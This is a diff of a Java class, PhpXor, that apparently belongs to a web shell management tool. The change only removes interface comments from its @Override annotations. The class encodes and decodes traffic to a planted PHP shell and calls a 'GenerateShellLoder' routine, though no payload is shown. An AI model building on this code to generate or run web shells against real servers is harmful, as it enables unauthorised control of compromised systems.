@@ -19,7 +19,7 @@ public class PhpXor implements Cryption {
     private ShellEntity shell;
     private boolean state;
 
-    @Override // core.imp.Cryption
+    @Override 
     public void init(ShellEntity context) {
         this.shell = context;
         this.http = this.shell.getHttp();
@@ -41,7 +41,7 @@ public class PhpXor implements Cryption {
         }
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] encode(byte[] data) {
         try {
             return E(data);
@@ -51,7 +51,7 @@ public class PhpXor implements Cryption {
         }
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] decode(byte[] data) {
         if (data == null || data.length <= 0) {
             return data;
@@ -64,7 +64,7 @@ public class PhpXor implements Cryption {
         }
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public boolean isSendRLData() {
         return true;
     }
@@ -90,12 +90,12 @@ public class PhpXor implements Cryption {
         return functions.subMiddleStr(new String(respResult), this.findStrLeft, this.findStrRight);
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public boolean check() {
         return this.state;
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] generate(String password, String secretKey) {
         return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
     }
